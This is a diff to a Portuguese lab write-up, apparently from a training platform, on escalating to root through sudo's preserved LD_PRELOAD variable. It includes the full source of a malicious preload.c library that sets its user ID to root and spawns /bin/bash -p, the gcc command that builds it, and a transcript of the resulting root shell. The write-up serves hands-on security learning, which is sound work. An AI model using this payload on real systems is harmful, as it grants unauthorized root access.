@@ -23,9 +23,9 @@ User user may run the following commands on debian:
  - SETENV = permite manter variáveis de ambiente (como LD_PRELOAD)
  - após usar o comando `-l | grep LD_PRELOAD` confirma que o `env_keep+=LD_PRELOAD` está ativo
 ```
-#Saída 
+#Saída: 
 
-`env_keep+=LD_PRELOAD` 
+env_keep+=LD_PRELOAD` 
 
  - $ ou seja, a variável LD_PRELOAD é preservada quando você usa sudo.
 ```
@@ -35,8 +35,8 @@ User user may run the following commands on debian:
 cd /home/user/tools/sudo   $ O lab vem com um script em c pro shell root
 nano preload.c
 ```
- - Conteúdo do scrip preload.c:
-
+##### Conteúdo do scrip preload.c:
+```
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -46,7 +46,7 @@ void _init() {
     setresuid(0,0,0);
     system("/bin/bash -p");
 } 
- 
+```
 ##### Compilar a biblioteca compartilhada
 
 `gcc -fPIC -shared -o preload.so preload.c -nostartfiles`
@@ -62,7 +62,7 @@ sh-4.1#
 whoami
 Root
 ```
-- Shell root Feito
+ - Shell root Feito
 
 ##### O que aprendi
 
